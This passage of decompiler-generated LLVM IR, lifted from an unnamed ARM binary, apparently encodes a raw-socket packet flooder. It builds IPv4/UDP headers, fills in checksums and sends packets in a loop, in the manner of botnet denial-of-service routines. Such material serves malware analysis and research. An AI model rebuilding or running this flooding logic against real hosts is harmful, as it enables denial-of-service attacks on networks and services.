  %v3_bccc = icmp eq i32 %v6_b98c, -1
  %v8_bccc = icmp eq i32 %v6_b98c, -1
  %v3_bce4 = icmp eq i32 %v3_ba1c, 65535
  %v2_bd20 = icmp eq i32 %v1_b978, 0
  br label %dec_label_pc_bb60

dec_label_pc_bb60:                                ; preds = %dec_label_pc_bb60, %dec_label_pc_bc60, %dec_label_pc_bb60.preheader
  %v0_bb64 = phi i32 [ %v0_bb64.pre, %dec_label_pc_bb60.preheader ], [ 0, %dec_label_pc_bc60 ], [ 0, %dec_label_pc_bb60 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bb64 = icmp eq i32 %v0_bb64, 0
  store i1 %v2_bb64, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bb64, label %dec_label_pc_bb60, label %dec_label_pc_bb70

dec_label_pc_bb70:                                ; preds = %dec_label_pc_bb60, %dec_label_pc_bc60
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb74

dec_label_pc_bb74:                                ; preds = %dec_label_pc_bbdc, %dec_label_pc_bb70
  %v1_bb88 = phi i32 [ %v1_bc50, %dec_label_pc_bbdc ], [ 0, %dec_label_pc_bb70 ]
  %v5_bb78 = mul i32 %v1_bb88, 24
  %v1_bb7c = load i32, i32* @r8, align 4
  %v2_bb7c = add i32 %v1_bb7c, %v5_bb78
  store i32 %v2_bb7c, i32* %r3.global-to-local, align 4
  store i32 %v2_b884, i32* %r1.global-to-local, align 4
  %v1_bb84 = add i32 %v2_bb7c, 20
  %v2_bb84 = inttoptr i32 %v1_bb84 to i8*
  %v3_bb84 = load i8, i8* %v2_bb84, align 1
  %v4_bb84 = zext i8 %v3_bb84 to i32
  store i32 %v4_bb84, i32* %r2.global-to-local, align 4
  %v4_bb88 = mul i32 %v1_bb88, 4
  %v5_bb88 = add i32 %v4_bb88, %v2_b884
  %v6_bb88 = inttoptr i32 %v5_bb88 to i32*
  %v7_bb88 = load i32, i32* %v6_bb88, align 4
  store i32 %v7_bb88, i32* @r5, align 4
  %v7_bb8c = icmp eq i8 %v3_bb84, 31
  store i1 %v7_bb8c, i1* %cpsr_z.global-to-local, align 1
  %v1_bb90 = add i32 %v7_bb88, 20
  store i32 %v1_bb90, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_bb84, 32
  br i1 %tmp62, label %dec_label_pc_bc74, label %dec_label_pc_bb98

dec_label_pc_bb98:                                ; preds = %dec_label_pc_bb74
  store i32 %v6_b98c, i32* %r3.global-to-local, align 4
  store i1 %v8_bccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_bccc, label %dec_label_pc_bcd4, label %dec_label_pc_bba4

dec_label_pc_bba4:                                ; preds = %dec_label_pc_bc74, %dec_label_pc_bb98
  store i32 %v3_ba1c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bce4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bce4, label %dec_label_pc_bcf0, label %dec_label_pc_bbb8

dec_label_pc_bbb8:                                ; preds = %dec_label_pc_bcd4.dec_label_pc_bbb8_crit_edge, %dec_label_pc_bba4
  %v1_bbbc = phi i32 [ %v1_bbbc.pre, %dec_label_pc_bcd4.dec_label_pc_bbb8_crit_edge ], [ 65535, %dec_label_pc_bba4 ]
  store i32 %v3_b9fc, i32* %r0.global-to-local, align 4
  %v9_bbbc = icmp eq i32 %v3_b9fc, %v1_bbbc
  store i1 %v9_bbbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bbbc, label %dec_label_pc_bd04, label %dec_label_pc_bbc4

dec_label_pc_bbc4:                                ; preds = %dec_label_pc_bcf0, %dec_label_pc_bbb8
  %v1_bbc8 = phi i32 [ %v1_bcfc, %dec_label_pc_bcf0 ], [ %v1_bbbc, %dec_label_pc_bbb8 ]
  store i32 %v3_ba14, i32* %r1.global-to-local, align 4
  %v9_bbc8 = icmp eq i32 %v3_ba14, %v1_bbc8
  store i1 %v9_bbc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bbc8, label %dec_label_pc_bd18, label %dec_label_pc_bbd0

dec_label_pc_bbd0:                                ; preds = %dec_label_pc_bd04, %dec_label_pc_bbc4
  store i32 %v1_b978, i32* %r3.global-to-local, align 4
  store i1 %v2_bd20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bd20, label %dec_label_pc_bbdc, label %dec_label_pc_bd2c

dec_label_pc_bbdc:                                ; preds = %dec_label_pc_bbd0, %dec_label_pc_bd18, %dec_label_pc_bd2c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_bbe0 = load i32, i32* @r5, align 4
  %v3_bbe0 = add i32 %v2_bbe0, 10
  %v4_bbe0 = inttoptr i32 %v3_bbe0 to i16*
  store i16 0, i16* %v4_bbe0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bbe8 = load i32, i32* @r5, align 4
  store i32 %v0_bbe8, i32* @r0, align 4
  %v2_bbec = call i32 @function_c848(i32 %v0_bbe8, i32 20)
  %v3_bbec = trunc i32 %v2_bbec to i16
  %v3_bbf0 = load i32, i32* @r5, align 4
  %v4_bbf0 = add i32 %v3_bbf0, 10
  %v5_bbf0 = inttoptr i32 %v4_bbf0 to i16*
  store i16 %v3_bbec, i16* %v5_bbf0, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bbf8 = load i32, i32* @r6, align 4
  %v3_bbf8 = add i32 %v2_bbf8, 6
  %v4_bbf8 = inttoptr i32 %v3_bbf8 to i16*
  store i16 0, i16* %v4_bbf8, align 2
  %v0_bbfc = load i32, i32* @r6, align 4
  store i32 %v0_bbfc, i32* @r1, align 4
  %v1_bc00 = add i32 %v0_bbfc, 4
  %v2_bc00 = inttoptr i32 %v1_bc00 to i16*
  %v3_bc00 = load i16, i16* %v2_bc00, align 2
  %v4_bc00 = zext i16 %v3_bc00 to i32
  store i32 %v4_bc00, i32* %r2.global-to-local, align 4
  %v0_bc04 = load i32, i32* @sl, align 4
  store i32 %v0_bc04, i32* %r3.global-to-local, align 4
  %v0_bc08 = load i32, i32* @r5, align 4
  store i32 %v0_bc08, i32* %r0.global-to-local, align 4
  %v4_bc0c = call i32 @function_c898(i32 %v0_bc08, i32 %v0_bbfc, i32 %v4_bc00, i32 %v0_bc04)
  %v5_bc0c = trunc i32 %v4_bc0c to i16
  store i32 %v4_bc0c, i32* %r0.global-to-local, align 4
  %v3_bc10 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc10, i32* %r3.global-to-local, align 4
  %v3_bc14 = mul i32 %v3_bc10, 32
  store i32 %v3_bc14, i32* %lr.global-to-local, align 4
  %v3_bc18 = load i32, i32* @r6, align 4
  %v4_bc18 = add i32 %v3_bc18, 6
  %v5_bc18 = inttoptr i32 %v4_bc18 to i16*
  store i16 %v5_bc0c, i16* %v5_bc18, align 2
  %v0_bc1c = load i32, i32* %lr.global-to-local, align 4
  %v1_bc1c = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_bc1c, -8
  %v5_bc1c = add i32 %v0_bc1c, %tmp63
  store i32 %v5_bc1c, i32* %lr.global-to-local, align 4
  %v0_bc20 = load i32, i32* @r6, align 4
  %v1_bc20 = add i32 %v0_bc20, 2
  %v2_bc20 = inttoptr i32 %v1_bc20 to i16*
  %v3_bc20 = load i16, i16* %v2_bc20, align 2
  %v1_bc24 = load i32, i32* @r8, align 4
  %v2_bc24 = add i32 %v1_bc24, %v5_bc1c
  store i32 %v2_bc24, i32* @lr, align 4
  %v3_bc28 = add i32 %v2_bc24, 2
  %v4_bc28 = inttoptr i32 %v3_bc28 to i16*
  store i16 %v3_bc20, i16* %v4_bc28, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_bc34 = load i32, i32* @r5, align 4
  store i32 %v0_bc34, i32* %r1.global-to-local, align 4
  %v0_bc38 = load i32, i32* @fp, align 4
  store i32 %v0_bc38, i32* %r0.global-to-local, align 4
  %v0_bc3c = load i32, i32* @sb, align 4
  store i32 %v0_bc3c, i32* %r2.global-to-local, align 4
  %v0_bc40 = load i32, i32* @lr, align 4
  %v6_bc48 = call i32 @function_11570(i32 %v0_bc38, i32 %v0_bc34, i32 %v0_bc3c, i32 16384, i32 %v0_bc40, i32 16)
  %v3_bc4c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc4c, i32* %r3.global-to-local, align 4
  %v1_bc50 = add i32 %v3_bc4c, 1
  store i32 %v1_bc50, i32* %r0.global-to-local, align 4
  %v1_bc54 = load i32, i32* @r7, align 4
  %v9_bc54 = icmp eq i32 %v1_bc50, %v1_bc54
  store i1 %v9_bc54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bc50, i32* %stack_var_-44, align 4
  %v5_bc5c = icmp slt i32 %v1_bc50, %v1_bc54
  br i1 %v5_bc5c, label %dec_label_pc_bb74, label %dec_label_pc_bc60

dec_label_pc_bc60:                                ; preds = %dec_label_pc_bbdc
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bc64 = icmp eq i32 %v1_bc54, 0
  store i1 %v2_bc64, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bc64, label %dec_label_pc_bb60, label %dec_label_pc_bb70

dec_label_pc_bc74:                                ; preds = %dec_label_pc_bb74
  %v1_bc74 = add i32 %v2_bb7c, 16
  %v2_bc74 = inttoptr i32 %v1_bc74 to i32*
  %v3_bc74 = load i32, i32* %v2_bc74, align 4
  %v0_bc78 = call i32 @function_e0b8()
  store i32 %v0_bc78, i32* %r0.global-to-local, align 4
  %v3_bc7c = load i32, i32* %stack_var_-44, align 4
  %v5_bc84 = mul i32 %v3_bc7c, 24
  %v1_bc88 = and i32 %v3_bc74, 16711680
  store i32 %v1_bc88, i32* %ip.global-to-local, align 4
  %v3_bc8c = udiv i32 %v3_bc74, 16777216
  %v4_bc90 = udiv i32 %v1_bc88, 256
  %v5_bc90 = or i32 %v4_bc90, %v3_bc8c
  store i32 %v5_bc90, i32* %r2.global-to-local, align 4
  %v1_bc94 = load i32, i32* @r8, align 4
  %v2_bc94 = add i32 %v1_bc94, %v5_bc84
  store i32 %v2_bc94, i32* %r1.global-to-local, align 4
  %v1_bc98 = and i32 %v3_bc74, 65280
  store i32 %v1_bc98, i32* %r3.global-to-local, align 4
  %v1_bc9c = add i32 %v2_bc94, 20
  %v2_bc9c = inttoptr i32 %v1_bc9c to i8*
  %v3_bc9c = load i8, i8* %v2_bc9c, align 1
  %v4_bc9c = zext i8 %v3_bc9c to i32
  store i32 %v4_bc9c, i32* %ip.global-to-local, align 4
  %v5_bca4 = call i32 @llvm.bswap.i32(i32 %v3_bc74)
  %v7_bca8 = lshr i32 %v0_bc78, %v4_bc9c
  %v8_bca8 = add i32 %v7_bca8, %v5_bca4
  store i32 %v8_bca8, i32* %r2.global-to-local, align 4
  %v1_bcac = and i32 %v8_bca8, 16711680
  store i32 %v1_bcac, i32* %r0.global-to-local, align 4
  %v1_bcb8 = and i32 %v8_bca8, 65280
  store i32 %v1_bcb8, i32* %r1.global-to-local, align 4
  %v5_bcc0 = call i32 @llvm.bswap.i32(i32 %v8_bca8)
  %v1_bcc4 = load i32, i32* @r5, align 4
  %v2_bcc4 = add i32 %v1_bcc4, 16
  %v3_bcc4 = inttoptr i32 %v2_bcc4 to i32*
  store i32 %v5_bcc0, i32* %v3_bcc4, align 4
  store i32 %v6_b98c, i32* %r3.global-to-local, align 4
  store i1 %v8_bccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bccc, label %dec_label_pc_bcd4, label %dec_label_pc_bba4

dec_label_pc_bcd4:                                ; preds = %dec_label_pc_bc74, %dec_label_pc_bb98
  %v0_bcd4 = call i32 @function_e0b8()
  store i32 %v0_bcd4, i32* %r0.global-to-local, align 4
  store i32 %v3_ba1c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bce4, i1* %cpsr_z.global-to-local, align 1
  %v1_bce8 = load i32, i32* @r5, align 4
  %v2_bce8 = add i32 %v1_bce8, 12
  %v3_bce8 = inttoptr i32 %v2_bce8 to i32*
  store i32 %v0_bcd4, i32* %v3_bce8, align 4
  br i1 %v3_bce4, label %dec_label_pc_bcf0, label %dec_label_pc_bcd4.dec_label_pc_bbb8_crit_edge

dec_label_pc_bcd4.dec_label_pc_bbb8_crit_edge:    ; preds = %dec_label_pc_bcd4
  %v1_bbbc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bbb8

dec_label_pc_bcf0:                                ; preds = %dec_label_pc_bcd4, %dec_label_pc_bba4
  %v0_bcf0 = call i32 @function_e0b8()
  %v1_bcf0 = trunc i32 %v0_bcf0 to i16
  %v3_bcf4 = load i32, i32* @r5, align 4
  %v4_bcf4 = add i32 %v3_bcf4, 4
  %v5_bcf4 = inttoptr i32 %v4_bcf4 to i16*
  store i16 %v1_bcf0, i16* %v5_bcf4, align 2
  store i32 %v3_b9fc, i32* %r0.global-to-local, align 4
  %v1_bcfc = load i32, i32* @r4, align 4
  %v9_bcfc = icmp eq i32 %v3_b9fc, %v1_bcfc
  store i1 %v9_bcfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bcfc, label %dec_label_pc_bd04, label %dec_label_pc_bbc4

dec_label_pc_bd04:                                ; preds = %dec_label_pc_bcf0, %dec_label_pc_bbb8
  %v0_bd04 = call i32 @function_e0b8()
  %v1_bd04 = trunc i32 %v0_bd04 to i16
  store i32 %v0_bd04, i32* %r0.global-to-local, align 4
  store i32 %v3_ba14, i32* %r1.global-to-local, align 4
  %v1_bd0c = load i32, i32* @r4, align 4
  %v9_bd0c = icmp eq i32 %v3_ba14, %v1_bd0c
  store i1 %v9_bd0c, i1* %cpsr_z.global-to-local, align 1
  %v3_bd10 = load i32, i32* @r5, align 4
  %v4_bd10 = add i32 %v3_bd10, 20
  %v5_bd10 = inttoptr i32 %v4_bd10 to i16*
  store i16 %v1_bd04, i16* %v5_bd10, align 2
  br i1 %v9_bd0c, label %dec_label_pc_bd18, label %dec_label_pc_bbd0

dec_label_pc_bd18:                                ; preds = %dec_label_pc_bd04, %dec_label_pc_bbc4
  %v0_bd18 = call i32 @function_e0b8()
  %v1_bd18 = trunc i32 %v0_bd18 to i16
  store i32 %v0_bd18, i32* %r0.global-to-local, align 4
  store i32 %v1_b978, i32* %r3.global-to-local, align 4
  store i1 %v2_bd20, i1* %cpsr_z.global-to-local, align 1
  %v3_bd24 = load i32, i32* @r6, align 4
  %v4_bd24 = add i32 %v3_bd24, 2
  %v5_bd24 = inttoptr i32 %v4_bd24 to i16*
  store i16 %v1_bd18, i16* %v5_bd24, align 2
  br i1 %v2_bd20, label %dec_label_pc_bbdc, label %dec_label_pc_bd2c

dec_label_pc_bd2c:                                ; preds = %dec_label_pc_bbd0, %dec_label_pc_bd18
  %v0_bd2c = load i32, i32* @r5, align 4
  %v1_bd2c = add i32 %v0_bd2c, 28
  store i32 %v1_bd2c, i32* %r0.global-to-local, align 4
  store i32 %v0_ba44, i32* %r1.global-to-local, align 4
  %v2_bd34 = inttoptr i32 %v1_bd2c to i16*
  %v3_bd34 = call i32 @function_e24c(i16* %v2_bd34, i32 %v0_ba44)
  store i32 %v3_bd34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bbdc

dec_label_pc_bd3c:                                ; preds = %dec_label_pc_b9b0
  %v0_bd3c = load i32, i32* @fp, align 4
  store i32 %v0_bd3c, i32* %r0.global-to-local, align 4
  %v1_bd40 = call i32 @function_10ddc(i32 %v0_bd3c)
  store i32 %v1_bd40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bd44

dec_label_pc_bd44:                                ; preds = %dec_label_pc_b868, %dec_label_pc_bd3c
  %v1_bd4c = phi i32 [ %v3_b9a0, %dec_label_pc_b868 ], [ %v1_bd40, %dec_label_pc_bd3c ]
  store i32 %v18_b868, i32* %sb.global-to-local, align 4
  store i32 %v27_b868, i32* %lr.global-to-local, align 4
  ret i32 %v1_bd4c

; uselistorder directives
  uselistorder i32 %v0_bd18, { 1, 0 }
  uselistorder i32 %v0_bd04, { 1, 0 }
  uselistorder i32 %v1_bcfc, { 1, 0 }
  uselistorder i32 %v3_bc74, { 2, 1, 3, 0 }
  uselistorder i32 %v1_bc50, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_bc1c, { 1, 0 }
  uselistorder i32 %v4_bc0c, { 1, 0 }
  uselistorder i1 %v2_bd20, { 2, 3, 1, 0 }
  uselistorder i1 %v3_bce4, { 3, 2, 0, 1 }
  uselistorder i32 %v3_ba90, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_ba78, { 1, 0 }
  uselistorder i32 %v1_ba48, { 1, 0, 2 }
  uselistorder i32 %v1_ba44, { 1, 0, 2 }
  uselistorder i32 %v3_ba1c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_ba04, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b9fc, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_b9f4, { 1, 0, 2 }
  uselistorder i32 %v0_ba44, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_b9e4, { 3, 1, 2, 0 }
  uselistorder i1 %v7_b9d0, { 1, 0 }
  uselistorder i1 %v7_b9a4, { 1, 0 }
  uselistorder i32 %v3_b9a0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_b98c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_b978, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v1_b904, { 1, 2, 0 }
  uselistorder i32 %v1_b8e0, { 2, 1, 0 }
  uselistorder i32 %v6_b8d8, { 1, 0 }
  uselistorder i32 %v7_b8c0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_b89c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_b884, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %sb.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 1, 3, 2, 4, 6, 5, 7, 8, 10, 9, 12, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 15, 14, 17, 16, 19, 20, 18, 22, 21, 24, 23, 25, 28, 26, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 46, 43, 44, 45, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %ip.global-to-local, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 2, 3, 4 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 1, 2 }
  uselistorder i32 (i16*, i32)* @function_e24c, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bd44, { 1, 0 }
  uselistorder label %dec_label_pc_bd2c, { 1, 0 }
  uselistorder label %dec_label_pc_bbdc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bb70, { 1, 0 }
  uselistorder label %dec_label_pc_bb60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bb60.preheader, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @function_bd54(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_bd54:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_bd54 = load i32, i32* @r4, align 4
  %v27_bd54 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_bd70 = call i32 @function_1215c(i32 %arg1, i32 4)
  %v0_bd74 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_bd70, i32* @fp, align 4
  %v0_bd84 = load i32, i32* @r4, align 4
  %v5_bd88 = inttoptr i32 %v0_bd74 to i32*
  %v6_bd88 = call i32 @function_8570(i32 %v0_bd84, i32* %v5_bd88, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_bd94 = urem i32 %v6_bd88, 256
  store i32 %v1_bd94, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bda0 = load i32, i32* @r4, align 4
  %v0_bda4 = load i32, i32* @r5, align 4
  %v5_bda8 = trunc i32 %v6_bd88 to i8
  %v6_bdac = inttoptr i32 %v0_bda4 to i32*
  %v7_bdac = call i32 @function_8570(i32 %v0_bda0, i32* %v6_bdac, i32 3, i32 65535, i32 %v6_bd88)
  %v0_bdb0 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bdac, i32* @r7, align 4
  %v0_bdc0 = load i32, i32* @r4, align 4
  %v5_bdc4 = inttoptr i32 %v0_bdb0 to i32*
  %v6_bdc4 = call i32 @function_8570(i32 %v0_bdc0, i32* %v5_bdc4, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_bdcc = urem i32 %v6_bdc4, 256
  store i32 %v1_bdcc, i32* %ip.global-to-local, align 4
  %v0_bdd0 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bddc = load i32, i32* @r4, align 4
  %sext = mul i32 %v6_bdc4, 16777216
  %v5_bde4 = sdiv i32 %sext, 16777216
  %v6_bde4 = inttoptr i32 %v0_bdd0 to i32*
  %v7_bde4 = call i32 @function_8570(i32 %v0_bddc, i32* %v6_bde4, i32 5, i32 0, i32 %v5_bde4)
  %v1_bdf0 = urem i32 %v7_bde4, 256
  store i32 %v1_bdf0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bdfc = load i32, i32* @r4, align 4
  %v0_be00 = load i32, i32* @r5, align 4
  %v5_be08 = inttoptr i32 %v0_be00 to i32*
  %v6_be08 = call i32 @function_8570(i32 %v0_bdfc, i32* %v5_be08, i32 6, i32 65535, i32 %v1_bdf0)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_be18 = load i32, i32* @r5, align 4
  store i32 %v6_be08, i32* @r6, align 4
  %v0_be20 = load i32, i32* @r4, align 4
  %v5_be24 = inttoptr i32 %v0_be18 to i32*
  %v6_be24 = call i32 @function_8570(i32 %v0_be20, i32* %v5_be24, i32 7, i32 27015, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_be24, i32* @r4, align 4
  %v1_be30 = call i32 @function_fd64(i32 23)
  %v3_be3c = call i32 @function_fca0(i32 23, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_be50 = call i32 @function_115f4(i32 2, i32 3, i32 17)
  %v7_be54 = icmp eq i32 %v3_be50, -1
  store i1 %v7_be54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_be50, i32* @sb, align 4
  br i1 %v7_be54, label %dec_label_pc_c17c, label %dec_label_pc_be60

dec_label_pc_be60:                                ; preds = %dec_label_pc_bd54
  store i32 1, i32* %stack_var_-44, align 4
  %v6_be68 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_be68, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_be7c = call i32 @function_115b0(i32 %v3_be50, i32 0, i32 3, i32 %v6_be68, i32 ptrtoint (i32* @0 to i32))
  %v7_be80 = icmp eq i32 %v5_be7c, -1
  store i1 %v7_be80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_be80, label %dec_label_pc_c174, label %dec_label_pc_be88

dec_label_pc_be88:                                ; preds = %dec_label_pc_be60
  %v0_be88 = load i32, i32* @r4, align 4
  %v3_be88 = mul i32 %v0_be88, 65536
  store i32 %v3_be88, i32* @lr, align 4
  %v0_be8c = load i32, i32* @r7, align 4
  %v0_be90 = load i32, i32* @r6, align 4
  %v3_be90 = mul i32 %v0_be90, 65536
  store i32 %v3_be90, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_be98 = urem i32 %v0_be8c, 65536
  %v3_be9c = urem i32 %v0_be90, 65536
  store i32 %v3_be9c, i32* %r2.global-to-local, align 4
  %v3_bea0 = urem i32 %v0_be88, 65536
  store i32 %v3_bea0, i32* %r3.global-to-local, align 4
  %v0_bea4 = load i32, i32* @r8, align 4
  %v2_bea4 = icmp eq i32 %v0_bea4, 0
  store i1 %v2_bea4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bea4, label %dec_label_pc_bfe0.preheader, label %dec_label_pc_bebc

dec_label_pc_bebc:                                ; preds = %dec_label_pc_be88
  %tmp33 = mul i32 %v0_be8c, 256
  %v3_becc = and i32 %tmp33, 65280
  store i32 %v3_becc, i32* %r3.global-to-local, align 4
  %tmp34 = mul i32 %v0_be90, 256
  %v3_bed0 = and i32 %tmp34, 65280
  store i32 %v3_bed0, i32* %r2.global-to-local, align 4
  %tmp35 = mul i32 %v0_be88, 256
  %v3_bed4 = and i32 %tmp35, 65280
  %tmp36 = udiv i32 %v0_be8c, 256
  %v4_bed8 = urem i32 %tmp36, 256
  %v5_bed8 = or i32 %v4_bed8, %v3_becc
  store i32 %v5_bed8, i32* @r5, align 4
  %tmp37 = udiv i32 %v0_be90, 256
  %v4_bedc = urem i32 %tmp37, 256
  %v5_bedc = or i32 %v4_bedc, %v3_bed0
  store i32 %v5_bedc, i32* @r6, align 4
  %tmp38 = udiv i32 %v0_be88, 256
  %v4_bee0 = urem i32 %tmp38, 256
  %v5_bee0 = or i32 %v4_bee0, %v3_bed4
  store i32 %v5_bee0, i32* @r7, align 4
  %v1_bf68 = trunc i32 %v5_bde4 to i8
  br label %dec_label_pc_bee4

dec_label_pc_bee4:                                ; preds = %.thread, %dec_label_pc_bebc
  %v2_beec = call i32 @function_1215c(i32 128, i32 1)
  %v3_bef0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bef0, i32* %r2.global-to-local, align 4
  %v5_bef8 = mul i32 %v3_bef0, 24
  store i32 %v5_bef8, i32* %r3.global-to-local, align 4
  %v1_befc = load i32, i32* @fp, align 4
  %v2_befc = load i32, i32* @r4, align 4
  %v5_befc = mul i32 %v2_befc, 4
  %v6_befc = add i32 %v5_befc, %v1_befc
  %v7_befc = inttoptr i32 %v6_befc to i32*
  store i32 %v2_beec, i32* %v7_befc, align 4
  %v0_bf00 = load i32, i32* %r3.global-to-local, align 4
  %v1_bf00 = load i32, i32* @sl, align 4
  %v2_bf00 = add i32 %v1_bf00, %v0_bf00
  store i32 %v2_bf00, i32* %r3.global-to-local, align 4
  %v0_bf04 = load i32, i32* @fp, align 4
  %v1_bf04 = load i32, i32* %r2.global-to-local, align 4
  %v4_bf04 = mul i32 %v1_bf04, 4
  %v5_bf04 = add i32 %v4_bf04, %v0_bf04
  %v6_bf04 = inttoptr i32 %v5_bf04 to i32*
  %v7_bf04 = load i32, i32* %v6_bf04, align 4
  store i32 %v7_bf04, i32* @lr, align 4
  %v1_bf0c = inttoptr i32 %v7_bf04 to i8*
  %v2_bf0c = load i8, i8* %v1_bf0c, align 1
  %tmp = urem i8 %v2_bf0c, 16
  %v1_bf10 = zext i8 %tmp to i32
  %v1_bf14 = or i32 %v1_bf10, 64
  store i32 %v1_bf14, i32* %r3.global-to-local, align 4
  %v1_bf1c = trunc i32 %v1_bf14 to i8
  store i8 %v1_bf1c, i8* %v1_bf0c, align 1
  %v0_bf20 = load i32, i32* @lr, align 4
  %v1_bf20 = inttoptr i32 %v0_bf20 to i8*
  %v2_bf20 = load i8, i8* %v1_bf20, align 1
  %v1_bf24 = and i8 %v2_bf20, -16
  %v1_bf28 = or i8 %v1_bf24, 5
  store i8 %v1_bf28, i8* %v1_bf20, align 1
  %v2_bf34 = load i32, i32* @lr, align 4
  %v3_bf34 = add i32 %v2_bf34, 1
  %v4_bf34 = inttoptr i32 %v3_bf34 to i8*
